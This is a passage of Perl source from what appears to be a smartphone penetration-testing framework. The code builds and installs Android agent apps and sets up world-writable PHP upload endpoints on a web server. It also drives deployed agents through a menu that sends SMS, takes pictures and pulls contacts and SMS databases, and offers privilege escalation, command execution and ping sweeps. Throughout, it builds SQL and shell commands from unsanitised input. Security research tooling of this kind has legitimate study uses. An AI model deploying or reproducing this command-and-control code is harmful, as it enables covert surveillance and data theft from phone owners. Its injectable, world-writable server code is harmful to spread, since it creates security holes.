			last;
		}
	} 
}

sub copyapp()
{
        $webpath = $Variables{"WEBSERVER"};
        while(1)
	{
	print "Which App?\n";
	print "\t1.)Framework Android App with NFC\n";
                print "\t2.)Framework Android App without NFC\n";
	$which = <>;
	chomp($which);
	if ($which == 1)
	{
	print "Hosting Path:";
        $path = <>;
        print "Filename:";
        $filename = <>;
        chomp($path);
        chomp($filename);
        $fullpath = $webpath. $path;
        $command1 = "mkdir " . $fullpath;
        system($command1);
        $location = $Variables{"ANDROIDAPPNFCAPP"};
        $command = "cp " . $location . " " . $webpath . $path . $filename;
        system($command);
	last;
	}
 if ($which == 2)
        {
        print "Hosting Path:";
        $path = <>;
        print "Filename:";
        $filename = <>;
        chomp($path);
        chomp($filename);
        $fullpath = $webpath. $path;
        $command1 = "mkdir " . $fullpath;
        system($command1);
        $location = $Variables{"ANDROIDAPPAPP"};
        $command = "cp " . $location . " " . $webpath . $path . $filename;
        system($command);
	last;
        }
	}

}
sub appadb()
{
	$androidsdk = $Variables{"ANDROIDSDK"};
	$adbstring = $androidsdk . "/platform-tools/adb";
	while(1)
	{
	$command = $adbstring . " devices";
	system($command);
	print "Choose a device to install on: ";
	$device = <>;
	chomp($device);
	print "Which App?\n";
        print "\t1.)Framework Android App with NFC\n";
                print "\t2.)Framework Android App without NFC\n";
 print "spf>";
        $which = <>;
        chomp($which);
        if ($which == 1)
        {
        
        $location = $Variables{"ANDROIDAPPNFCAPP"};
        $command = $adbstring . " -s " . $device . " install " . $location;
        system($command);
        last;
        }

   if ($which == 2)
        {

        $location = $Variables{"ANDROIDAPPAPP"};
        $command = $adbstring . " -s " . $device . " install " . $location;
        system($command);
        last;
        }
	}

}
sub app_make()
{
		print "\n\nChoose a type of control app to generate:\n";
		print "\t1.) Android App (Android 1.6)\n";
		print "\t2.) Android App with NFC (Android 4.0 and NFC enabled device)\n";
		print "spf>";
		$choice5 = <>;
		if ($choice5 == 1)
		{
			makeandroid();
			last;
		}
		if ($choice5 == 2)
		{
			makeandroid2();
			last;
		}
		if ($choice5 == 0)
		{
			last;
		}
}

sub makeandroid()
{
	$sourcelocation = $Variables{"ANDROIDAPP"};	
	$androidsdk = $Variables{"ANDROIDSDK"};
	$androidapplocation = $Variables{"ANDROIDAPPAPP"};
	$fullpath1 = $sourcelocation . "/res/values/strings.xml";
				print "Phone number of agent:";
				$controlphone = <>;
                		chomp($controlphone);
				print "Control key for the agent:";
                		$controlkey = <>;
                		chomp($controlkey);
	        		print "Webserver control path for agent:";
                		$controlpath = <>;
                		chomp($controlpath);
                		print "\n\nControl Number:" .  $controlphone .  "\nControl Key:" . $controlkey . "\nControlPath:" . $controlpath . "\nIs this correct?(y/n)";
                		$correct = <>;
                		chomp($correct);
                		if (lc($correct) eq "y")
                		{
				
				$command = "sed -i \'s/\<string-array name=\"keyarray\"\>\<item\>.*/\<string-array name=\"keyarray\"\>\<item\>" . $controlkey . "\<\\/item\><\\/string-array> /' " . $fullpath1; 
				system($command);
				$command = "sed -i \'s/\<string-array name=\"agentarray\"><item>.*/<string-array name=\"agentarray\"><item>" . $controlphone . "<\\/item><\\/string-array> /' " . $fullpath1;
				system($command);
				$command = "sed -i \'s/\<string-array name=\"patharray\"><item>.*/<string-array name=\"patharray\"><item>\\" . $controlpath . "<\\/item><\\/string-array> /' " . $fullpath1;
				system($command);
				$command = $androidsdk . "/tools/android update project --path " . $sourcelocation . " --target \"Google Inc.:Google APIs:4";
			system($command);
			$command = $androidsdk . "/tools/android update project --path " .$sourcelocation;
			system($command);
			$command = "ant -f " . $sourcelocation .  "/build.xml clean debug";
			system($command);
			$command = "cp " . $sourcelocation . "/bin/" . "FrameworkAndroidAppActivity-debug-unaligned.apk " . $androidapplocation;
			system($command);

				}
			}




sub makeandroid2()
{
	$sourcelocation = $Variables{"ANDROIDAPPNFC"};	
	$androidsdk = $Variables{"ANDROIDSDK"};
	$androidappnfclocation = $Variables{"ANDROIDAPPNFCAPP"};
	$fullpath1 = $sourcelocation . "/res/values/strings.xml";
				print "Phone number of agent:";
				$controlphone = <>;
                		chomp($controlphone);
				print "Control key for the agent:";
                		$controlkey = <>;
                		chomp($controlkey);
	        		print "Webserver control path for agent:";
                		$controlpath = <>;
                		chomp($controlpath);
                		print "\n\nControl Number:" .  $controlphone .  "\nControl Key:" . $controlkey . "\nControlPath:" . $controlpath . "\nIs this correct?(y/n)";
                		$correct = <>;
                		chomp($correct);
                		if (lc($correct) eq "y")
                		{
				
				$command = "sed -i \'s/\<string-array name=\"keyarray\"\>\<item\>.*/\<string-array name=\"keyarray\"\>\<item\>" . $controlkey . "\<\\/item\><\\/string-array> /' " . $fullpath1; 
				system($command);
				$command = "sed -i \'s/\<string-array name=\"agentarray\"><item>.*/<string-array name=\"agentarray\"><item>" . $controlphone . "<\\/item><\\/string-array> /' " . $fullpath1;
				system($command);
				$command = "sed -i \'s/\<string-array name=\"patharray\"><item>.*/<string-array name=\"patharray\"><item>\\" . $controlpath . "<\\/item><\\/string-array> /' " . $fullpath1;
				system($command);
				$command = $androidsdk . "/tools/android update project --path " . $sourcelocation . " --target \"Google Inc.:Google APIs:14";
			system($command);
			$command = $androidsdk . "/tools/android update project --path " .$sourcelocation;
			system($command);
			$command = "ant -f " . $sourcelocation .  "/build.xml clean debug";
			system($command);
			$command = "cp " . $sourcelocation . "/bin/" . "FrameworkAndroidAppActivity-debug-unaligned.apk " . $androidappnfclocation;
			system($command);

				}
			}


sub app_connect
{
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};

	while(1)
	{
		print "\nConnect to a smartphone management app. You will need to supply the phone number,the control key, and the URL path\n\n";
		print "Phone Number:";
		$number = <>;
		print "Control Key:";
		$key = <>;
		print "App URL Path:";
        	$path = <>;
        	print "\n\nPhone Number: " . $number . "Control Key: " . $key . "URL Path: " . $path  . "Is this correct?(y/N):";
        	$correct = <>;
		chomp($number);
		chomp($path);
		chomp($key);
		chomp($correct);
		if (lc($correct) eq "y")
                {
                        $webserver = $_[0];
                        make_files2($path);
			handshake($path,$key);
			$modemtype = "app";
 		database_add2($number,$path,$key,$modemtype);
			$startcommand = "perl poller.pl " . $path . " " . $key . " > log"; 
			$pid = fork;
			die "fork failed" unless defined $pid;
			if ($pid ==0)
			{
			exec($startcommand);
			}
			last;
		}
	}
}

sub handshake
{
        $path = $_[0];
	$key = $_[1];
	$webserver = $Variables{WEBSERVER};
        $fullpath = $webserver. $path . "/connect";
	while(1){

	        open(CONNECTFILE, "+<$fullpath");
       		$line= <CONNECTFILE>;
		$correctstring = $key . " CONNECT";
		if ($line eq $correctstring)
		{
			$command = "\n" . $key . " CONNECTED";
			print CONNECTFILE $command;
			close(CONNECTFILE);
			print "CONNECTED!\n";
			last;
		}
		else {
			 close(CONNECTFILE);
			sleep(1);
		}
	}
                
}

sub database_add2 
{
	$table = "modems";
	$sqlserver = $Variables{"MYSQLSERVER"};
        $username = $Variables{"MYSQLUSER"};
        $password = $Variables{"MYSQLPASS"};
        $port = $Variables{"MYSQLPORT"};
        $type = $Variables{"DATABASETYPE"};
	if ($type eq "postgres")
        {
                $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port","$username","$password");
		$number2 = "\'" .  $_[0] . "\'";
               	$path2 = "\'" . $_[1] . "\'";
                $key2 = "\'" . $_[2] . "\'";
                $type2 = "\'" . $_[3] . "\'";


	}
  	elsif ($type eq "mysql")
        {     
		$dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
		$number2 = "\"" . $_[0] . "\"";
		$path2 = "\"" . $_[1] . "\"";
		$key2 = "\"" . $_[2] . "\""; 
		$type2 = "\"" . $_[3] . "\"";
	}
	$insertquery = "INSERT INTO $table (id,number,path,controlkey,type) VALUES (DEFAULT,$number2,$path2,$key2, $type2)";
	$sql = $dbh->prepare($insertquery);
	$sql->execute;
}

sub make_files2
{
	$path = $_[0];
  	$webserver = $Variables{WEBSERVER};
	$fullpath = $webserver. $path;
	$command1 = "mkdir " . $fullpath;
	system($command1);
	$connectfile = $fullpath . "/connect";
	$command2 = "touch " . $connectfile;
	system($command2);
	$command3 = "chmod 777 " . $connectfile;
	system($command3);
	$picturefile = $fullpath . "/picture.jpg";
	$command4 = "touch " . $picturefile;
	system($command4);
	$command5 = "chmod 777 " . $picturefile;
	system($command5);
	$textfile = $fullpath . "/text.txt";
        $command6 = "touch " . $textfile;
        system($command6);
        $command7 = "chmod 777 " . $textfile;
        system($command7);
	$textfile2 = $fullpath . "/text2.txt";
	$command77 = "touch ". $textfile2;
	system($command77);
	$command7777 = "chmod 777 " . $textfile2;
        system($command7777);
	$pictureupload = $fullpath . "/pictureupload.php";
        $command8 = "touch " . $pictureupload;
        system($command8);
        $command9 = "chmod 777 " . $pictureupload;
        system($command9);
	$pictureuploadtext = "<?php\n\$base=\$_REQUEST['picture'];\necho \$base;\n\$binary=base64_decode(\$base);\nheader('Content-Type: bitmap; charset=utf-8');\n\$file = fopen('picture.jpg', 'wb');\nfwrite(\$file, \$binary);\nfclose(\$file);\n?>";
	open(PICFILE, ">$pictureupload");
	print PICFILE $pictureuploadtext;
	close(PICFILE);
	$textupload = $fullpath . "/textuploader.php";
        $command10 = "touch " . $textupload;
        system($command10);
        $command11 = "chmod 777 " . $textupload;
        system($command11);
        $textuploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('text.txt', 'ab');\nfwrite(\$file, \$base);\n?>";
        open(TEXTFILE, ">$textupload");
        print TEXTFILE $textuploadtext;
        close(TEXTFILE);
	$text2upload = $fullpath . "/text2uploader.php";
        $command100 = "touch " . $text2upload;
        system($command100);
        $command110 = "chmod 777 " . $text2upload;
        system($command110);
	$text2uploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('text2.txt', 'wb');\nfwrite(\$file, \$base);\n?>";
        open(TEXT2FILE, ">$text2upload");
        print TEXT2FILE $text2uploadtext;
        close(TEXT2FILE);
	$connectupload = $fullpath . "/connectuploader.php";
        $command12 = "touch " . $connectupload;
        system($command12);
        $command13 = "chmod 777 " . $connectupload;
        system($command13);
        $connectuploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('connect','wb');\nfwrite(\$file, \$base);\n?>";
        open(CONNECTFILE, ">$connectupload");
        print CONNECTFILE $connectuploadtext;
        close(CONNECTFILE);
	$getfuncfile = $fullpath . "/getfunc";
        $command6 = "touch " . $getfuncfile;
        system($command6);
        $command7 = "chmod 777 " . $getfuncfile;
        system($command7);
	$putfuncfile = $fullpath . "/putfunc";
        $command6 = "touch " . $putfuncfile;
        system($command6);
        $command7 = "chmod 777 " . $putfuncfile;
        system($command7);
	$getfuncupload = $fullpath . "/getfuncuploader.php";
        $command10 = "touch " . $getfuncupload;
        system($command10);
        $command11 = "chmod 777 " . $getfuncupload;
        system($command11);
        $getfuncuploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('getfunc', 'wb');\nfwrite(\$file, \$base);\n?>";
        open(GETFUNCUPLOADFILE, ">$getfuncupload");
        print GETFUNCUPLOADFILE $getfuncuploadtext;
        close(GETFUNCUPLOADFILE);
	 $putfuncupload = $fullpath . "/putfuncuploader.php";
        $command10 = "touch " . $putfuncupload;
        system($command10);
        $command11 = "chmod 777 " . $putfuncupload;
        system($command11);
        $putfuncuploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('putfunc', 'wb');\nfwrite(\$file, \$base);\n?>";
        open(PUTFUNCUPLOADFILE, ">$putfuncupload");
        print PUTFUNCUPLOADFILE $putfuncuploadtext;
        close(PUTFUNCUPLOADFILE);
	
}



sub view_data 
{
	$webserver = $Variables{"WEBSERVER"};
	print "View Data Gathered from a Deployed Agent:\n\n";
	while (1)
	{
			
		print "\n\nAvailable Agents:\n\n";
		$sqlserver = $Variables{"MYSQLSERVER"};
                $username = $Variables{"MYSQLUSER"};
                $password = $Variables{"MYSQLPASS"};
                $port = $Variables{"MYSQLPORT"};
                 $type = $Variables{"DATABASETYPE"};
 		if ($type eq "postgres")
                {
                        $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
		
		}
  		elsif ($type eq "mysql")
                {     
			  $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                }

		$rowsquery = "SELECT COUNT(*) from agents";
		$sql = $dbh->prepare($rowsquery);
		$results = $sql->execute;
		@rows = $sql->fetchrow_array();
		$row = @rows[0];
		for($i=1; $i<=$row; $i++)
		{
			 $selectquery = "SELECT number from agents where id=" . $i;
			$sql = $dbh->prepare($selectquery);
			$results = $sql->execute;
			@rows = $sql->fetchrow_array();
			$r = @rows[0];
			print "\t" . $i . ".) " . $r . "\n";
		}
		 print "\nSelect an agent to interact with or 0 to return to the previous menu.";
                print "\nspf>";
                $chosenagent = <>;
		if (($chosenagent == "exit") || ($chosenagent == 0))
		{
			return;
		}
		for($j=1; $j<=$row; $j++)
		{
			if ($chosenagent == $j)
			{
				get_data($j);
				last;
			}
		}

	}
}

sub get_data
{
	$id = $_[0];
	$sqlserver = $Variables{"MYSQLSERVER"};
        $username = $Variables{"MYSQLUSER"};
        $password = $Variables{"MYSQLPASS"};
        $port = $Variables{"MYSQLPORT"};
        $type = $Variables{"DATABASETYPE"}; 
	if ($type eq "postgres")
        {
              $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
	}
 	 elsif ($type eq "mysql")
        {
	      $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
        }
	$query1 = "SELECT sms from data where id=" . $id;
	$sql = $dbh->prepare($query1);
	$sms = $sql->execute;
	@rows = $sql->fetchrow_array();
        $smsrow= @rows[0];
	$query2 = "SELECT contacts from data where id=" . $id;
        $sql = $dbh->prepare($query2);
        $contacts = $sql->execute;
	@rows = $sql->fetchrow_array();
        $contactsrow = @rows[0];
	$query3 = "SELECT picture from data where id=" . $id;
        $sql = $dbh->prepare($query3);
        $picture = $sql->execute;
	@rows = $sql->fetchrow_array();
        $picturerow = @rows[0];
	$query4 = "SELECT root from data where id=" . $id;
        $sql = $dbh->prepare($query4);
        $root = $sql->execute;
	 @rows = $sql->fetchrow_array();
         $rootrow = @rows[0];
	$query5 = "SELECT ping from data where id=" . $id;
        $sql = $dbh->prepare($query5);
        $root = $sql->execute;
	 @rows = $sql->fetchrow_array();
         $pingrow = @rows[0];
	$query6 = "SELECT file from data where id=" . $id;
        $sql = $dbh->prepare($query6);
        $root = $sql->execute;
	 @rows = $sql->fetchrow_array();
         $filerow = @rows[0];
	print "\n\nData:\n";
	print "SMS Database: " . $smsrow . "\n";
	print "Contacts: " . $contactsrow . "\n";
	print "Picture Location: " . $picturerow . "\n";
	print "Rooted: " . $rootrow . "\n";
	print "Ping Sweep: " . $pingrow . "\n";
	print "File: " . $filerow . "\n";
	print "Press <Enter> to continue";
	<>;
 
}

sub agent_attach
{
 	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	print "Attach to a Deployed Agent:\n\n";
	while (1)
	{
		print "This will set up handlers to control an agent that has already been deployed.\n\n";
		print "Agent URL Path:";
		$path = <>;
		print "Agent Control Key:";
		$key = <>;
		print "\n\nURL Path: " . $path . "Control Key: ". $key . "Is this correct?(y/N):";
		$correct = <>;
		chomp($correct);
		chomp($path);
		chomp($key);
		#chomp($phonenumber2);
		#chomp($phonenumber);
		if (lc($correct) eq "y")
		{
			if ($path ne "")
			{
				make_files($path);
			}
			$command = $key . " ATTA";
			$control = $webserver . $path . "/control";
                        	open(CONTROLFILE, ">$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                        	sleep 60;
                       		$text = $webserver . $path . "/text.txt";
                       		open(TEXTFILE, "+<$text");
                       		$line= <TEXTFILE>;
				@lines = split(/,/, $line);
				$phonenumber = @lines[1];
				$platform = @lines[2];
				$phonenumber2 = @lines[3];
				close(TEXTFILE);
				open(TEXTFILE2, ">$text");
                                print TEXTFILE2 "";
                                close(TEXTFILE2);

			database_add($phonenumber,$path,$key,$phonenumber2,$platform);
			$type = $Variables{"DATABASETYPE"};
			if ($type eq "postgres")
                	{
                        	$dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
				$query2 = "SELECT id from agents where number=" . "\'" . $phonenumber . "\'";

			}
  			elsif ($type eq "mysql")
                	{     
				  $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
				$phonenumberr = "\"" . $phonenumber . "\"";
				  $query2 = "SELECT id from agents where number=" . $phonenumberr;
			}
			$sql = $dbh->prepare($query2);
        		$idblah = $sql->execute;
 			@rows = $sql->fetchrow_array();
        		$id = @rows[0];
			$startcommand = "perl agentpoll.pl " . $path . " " . $key . " " . $id . " > log2"; 
                       $pid = fork;
                        die "fork failed" unless defined $pid;
                        if ($pid ==0)
                        {
                        system($startcommand);
                        }

			last;
		}
		
	}
} 

sub make_files
{
	$webserver = $Variables{"WEBSERVER"};
	$path = $_[0];
	$fullpath = $webserver. $path;
	$command1 = "mkdir " . $fullpath;
	system($command1);
	$controlfile = $fullpath . "/control";
	$command2 = "touch " . $controlfile;
	system($command2);
	$command3 = "chmod 777 " . $controlfile;
	system($command3);
	$picturefile = $fullpath . "/picture.jpg";
	$command4 = "touch " . $picturefile;
	system($command4);
	$command5 = "chmod 777 " . $picturefile;
	system($command5);
	$textfile = $fullpath . "/text.txt";
        $command6 = "touch " . $textfile;
        system($command6);
        $command7 = "chmod 777 " . $textfile;
        system($command7);
	$pictureupload = $fullpath . "/pictureupload.php";
        $command8 = "touch " . $pictureupload;
        system($command8);
        $command9 = "chmod 777 " . $pictureupload;
        system($command9);
	$pictureuploadtext = "<?php\n\$base=\$_REQUEST['picture'];\necho \$base;\n\$binary=base64_decode(\$base);\nheader('Content-Type: bitmap; charset=utf-8');\n\$file = fopen('picture.jpg', 'wb');\nfwrite(\$file, \$binary);\nfclose(\$file);\n?>";
	open(PICFILE, ">$pictureupload");
	print PICFILE $pictureuploadtext;
	close(PICFILE);
	$textupload = $fullpath . "/textuploader.php";
        $command10 = "touch " . $textupload;
        system($command10);
        $command11 = "chmod 777 " . $textupload;
        system($command11);
        $textuploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('text.txt', 'wb');\nfwrite(\$file, \$base);\n?>";
        open(TEXTFILE, ">$textupload");
        print TEXTFILE $textuploadtext;
        close(TEXTFILE);
	$controlupload = $fullpath . "/controluploader.php";
        $command12 = "touch " . $controlupload;
        system($command12);
        $command13 = "chmod 777 " . $controlupload;
        system($command13);
        $controluploadtext = "<?php\n\$base=\$_REQUEST['text'];\nheader('Content-Type: text; charset=utf-8');\n\$file = fopen('control','wb');\nfwrite(\$file, \$base);\n?>";
        open(CONTROLFILE, ">$controlupload");
        print CONTROLFILE $controluploadtext;
        close(CONTROLFILE);
	$putfile = $fullpath . "/putfunc";
        $command14 = "touch " . $putfile;
        system($command14);
        $command15 = "chmod 777 " . $putfile;
        system($command15);

	
}

sub database_add 
{
	$table = "agents";
	$table2 = "data";
        $sqlserver = $Variables{"MYSQLSERVER"};
        $username = $Variables{"MYSQLUSER"};
        $password = $Variables{"MYSQLPASS"};
        $port = $Variables{"MYSQLPORT"};
         $type = $Variables{"DATABASETYPE"}; 
	if ($type eq "postgres")
                {
                        $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
			$number = "\'" . $_[0] . "\'";
                        $path = "\'" . $_[1] . "\'";
                        $key = "\'" . $_[2] . "\'";
                        $number2 = "\'" . $_[3] . "\'";
                        $platform = "\'" . $_[4] . "\'";

		}
  	elsif ($type eq "mysql")
                {     
			  $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
        		$number = "\"" . $_[0] . "\"";
			$path = "\"" . $_[1] . "\"";
			$key = "\"" . $_[2] . "\""; 
			$number2 = "\"" . $_[3] . "\"";
			$platform = "\"" . $_[4] . "\"";
		}
	$insertquery = "INSERT INTO $table (id,number,path,controlkey,controlnumber,platform) VALUES (DEFAULT,$number,$path,$key,$number2,$platform)";
	$insertquery2 = "INSERT INTO $table2 (id,sms,contacts,picture,root) VALUES (DEFAULT, NULL, NULL, NULL, NULL)";
	$sql = $dbh->prepare($insertquery);
	$sql->execute;
	$sql2 = $dbh->prepare($insertquery2);
	$sql2->execute;
}

sub agent_control
{
	$webserver = $Variables{"WEBSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};
	while(1)
	{
		print "\n\nAvailable Agents:\n\n";
		$sqlserver = $Variables{"MYSQLSERVER"};
                $username = $Variables{"MYSQLUSER"};
                $password = $Variables{"MYSQLPASS"};
                $port = $Variables{"MYSQLPORT"};
                $type = $Variables{"DATABASETYPE"}; 
		if ($type eq "postgres")
                {
                        $dbh = DBI->connect("DBI:Pg:dbname=framework;host=$sqlserver;port=$port",$username,$password);
		}
  		elsif ($type eq "mysql")
                {     
			  $dbh = DBI->connect("dbi:mysql:database=framework;host=$sqlserver;port=$port", $username,$password);
                }
		$rowsquery = "SELECT COUNT(*) from agents";
		$sql = $dbh->prepare($rowsquery);
		$results = $sql->execute;
		@rows = $sql->fetchrow_array();
		$row = @rows[0];
		for($i=1; $i<=$row; $i++)
		{
			$selectquery = "SELECT number from agents where id=" . $i;
			$sql = $dbh->prepare($selectquery);
			$results = $sql->execute;
			@rows = $sql->fetchrow_array();
			$r = @rows[0];
			print "\t" . $i . ".) " . $r . "\n";
		}
		print "\nSelect an agent to interact with or 0 to return to the previous menu\n";
		print "\nspf>";
		$chosenagent = <>;
		if (($chosenagent == "exit") || ($chosenagent == 0))
		{
			last;
		}
		for($j=1; $j<=$row; $j++)
		{
			if ($chosenagent == $j)
			{
				$numberquery = "SELECT number from agents where id=" . $j;
				$sql = $dbh->prepare($numberquery);
				$results = $sql->execute;
				@rows = $sql->fetchrow_array();
				$number = @rows[0];
				$keyquery = "SELECT controlkey from agents where id=" . $j;
				$sql = $dbh->prepare($keyquery);
				$results = $sql->execute;
				@rows = $sql->fetchrow_array();
				$key = @rows[0];
				$pathquery = "SELECT path from agents where id=" . $j;
				$sql = $dbh->prepare($pathquery);
				$results = $sql->execute;
				@rows = $sql->fetchrow_array();
				$path = @rows[0];
				control_agent($number,$path,$key,$j);
				
			}
		
		}	
	}
}

sub control_agent
{
	while(1)
	{
		$webserver = $Variables{"WEBSERVER"};
        	$sqlserver = $Variables{"SQLSERVER"};
        	$ipaddress = $Variables{"IPADDRESS"};
		$number = $_[0];
		$path = $_[1];
		$key = $_[2];
		$id = $_[3];
		print "\n\nCommands:\n\n";
		print "\t1.) Send SMS\n";
		print "\t2.) Take Picture\n";
		print "\t3.) Get Contacts\n";
		print "\t4.) Get SMS Database\n";
		print "\t5.) Privilege Escalation\n";
		print "\t6.) Download File\n";
		print "\t7.) Execute Command\n";
		print "\t8.) Upload File\n";
		print "\t9.) Ping Sweep\n";
		print "\t10.) TCP Listener\n";
		print "\t11.) Connect to Listener\n";
		print "\t\nSelect a command to perform or 0 to return to the previous menu\n";
		print "\nspf>";
		$choice1 = <>;
		chomp($choice1);
		if (($choice1 == "exit") || ($choice1 == 0))
		{
			last;
		}
		if ($choice1 == 1)
		{
			spam($number,$path,$key,$id);
		}
		if ($choice1 == 3)
		{
			getcontacts($number,$path,$key,$id);
		}
		if ($choice1 == 2)
		{
			picture($number, $path, $key,$id);
		}
		if ($choice1 == 4)
		{
			getsms($number, $path, $key,$id);
		}
		if ($choice1 == 5)
		{
			root($number, $path, $key,$id);
		}

		if ($choice1 == 6)
		{
			down($number,$path,$key,$id);
		}
		if ($choice1 == 7)
		{
			run($number,$path,$key,$id);
		}

		if ($choice1 == 8)
		{
			upload($number,$path,$key,$id);
		}
		if ($choice1 == 9)
		{
			ping($number,$path,$key,$id);
		}
		if ($choice1 == 10)
		{
			listener($number,$path,$key,$id);
		}
		if ($choice1 == 11)
		{
			connectlisten($number,$path,$key,$id);
		}
	}
}
sub spam
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};			
	while(1) 	
	{
		print "\n\tSend an SMS message to another phone. Fill in the number, the message to send, and the delivery method(SMS or HTTP).\n";
		print "Number:";
		$sendnumber = <>;
		print "\nMessage:";
		$sendmessage = <>;
		print "\nDelivery Method(SMS or HTTP)";
		$deliverymethod = <>;
		chomp($sendnumber);
		chomp($sendmessage); 
		chomp($deliverymethod);
		if ($deliverymethod eq "HTTP")
		{
			$command = $key . " " . "SPAM" . " " . "none" . " " . $deliverymethod . " " . $sendnumber . " " . $sendmessage . "\n";
			$control = $webserver . $path . "/putfunc";
			open(CONTROLFILE, ">>$control");
       		        print CONTROLFILE $command;
                        close(CONTROLFILE);
			last;

		}
		if ($deliverymethod eq "SMS")
		{
			$modem = get_modem();
			if ($modem == 0)
			{
				print "\nNo modems found. Attach a modem to use this functionality\n";
			}
			else
			{
				$command = $key . " " . "SPAM" . " " . $modem  . " " . $deliverymethod . " " . $sendnumber . " " . $sendmessage . "\n";
                        	$control = $webserver . $path . "/putfunc";
                        	open(CONTROLFILE, ">>$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                       	 	last;
		
			}


		}	

	}
}

sub getcontacts
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};			
	while(1) 	
	{
		print "\n\tGet contacts from phone with agent. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP).\n";
		print "\nDelivery Method(SMS or HTTP)";
		print "\nspf>";
		$deliverymethod = <>;
		print "\nReturn Method(SMS or HTTP)";
		print "\nspf>";
		$returnmethod = <>; 
		chomp($deliverymethod);
		chomp($returnmethod);
		if ($returnmethod eq "SMS")
		{
			$modem = get_modem();
			 if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use
this functionality\n";
                        }
                        else
                        {
				if ($deliverymethod eq "HTTP")
				{
					$command = $key . " CONT " . $deliverymethod . " " . $returnmethod .  " " . $modem . "\n";
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                               	 	last;

		
				}
				if ($deliverymethod eq "SMS")
				{
					$modem = get_modem();
                        		if ($modem == 0)
                        		{
                                		print "\nNo modems found. Attach a modem to use this functionality\n";
                        		}
                        		else
                        		{
			 			$command = $key . " CONT " . $deliverymethod . " " . $returnmethod . " " . $modem . "\n";
                        			$control = $webserver . $path . "/putfunc";
                        			open(CONTROLFILE, ">>$control");
                        			print CONTROLFILE $command;
                        			close(CONTROLFILE);
                                		last;
					}	
				}
		
			}
		}
		if ($returnmethod eq "HTTP")
                {
                  
                        if ($deliverymethod eq "HTTP")
                        {
                                $command = $key . " CONT " . $deliverymethod . " " . $returnmethod .  "\n";
                        	$control = $webserver . $path . "/putfunc";
                        	open(CONTROLFILE, ">>$control");
                        	print CONTROLFILE $command;
                        	close(CONTROLFILE);
                                last;

                        }
			if ($deliverymethod eq "SMS")
			{
				$modem = get_modem();
                        	if ($modem == 0)
                        	{
                                	print "\nNo modems found. Attach a modem to use this functionality\n";
                        	}
                        	else
                        	{
			        	$command = $key . " CONT " . $deliverymethod . " " . $returnmethod . " " . $modem . "\n";
                        		$control = $webserver . $path . "/putfunc";
                        		open(CONTROLFILE, ">>$control");
                        		print CONTROLFILE $command;
                        		close(CONTROLFILE);
                              		last;
					
				}
			}
		}

	}


}

sub picture
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
 	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};			
	while(1) 	
	{
		print "\n\tTake a picture and upload it to the webserver. Will upload a message if it fails.\n";
		print "Delivery Method (SMS or HTTP)";
		print "\nspf>";
		$delivery = <>;
		chomp($delivery);   
		if ($delivery eq "HTTP")
		{
			$command = $key . " PICT HTTP\n";
			$control = $webserver . $path . "/putfunc";
			open(CONTROLFILE, ">$control");
       		        print CONTROLFILE $command;
        		close(CONTROLFILE);	
			last;
		}
		if ($delivery eq "SMS")
		{
			$modem = get_modem();
                        if ($modem == 0)
                        {
                                print "\nNo modems found. Attach a modem to use this functionality\n";
                        }
                        else
                        {
			$command = $key . " PICT SMS " . $modem . "\n";
                        $control = $webserver . $path . "/putfunc";
                        open(CONTROLFILE, ">$control");
                        print CONTROLFILE $command;
                        close(CONTROLFILE);
                        last;
	
			}
		}
		

	}
}

sub getsms
{
	$number = $_[0];
	$path = $_[1];
	$key = $_[2];
	$id = $_[3];
	$webserver = $Variables{"WEBSERVER"};
        $sqlserver = $Variables{"MYSQLSERVER"};
        $ipaddress = $Variables{"IPADDRESS"};		
	while(1) 	
	{
		print "\n\tGet last 10 sms from phone with agent. Fill in the delivery method(SMS or HTTP) and return method (SMS or HTTP).\n";
		print "\nDelivery Method(SMS or HTTP)";
		print "\nspf>";
		$deliverymethod = <>;
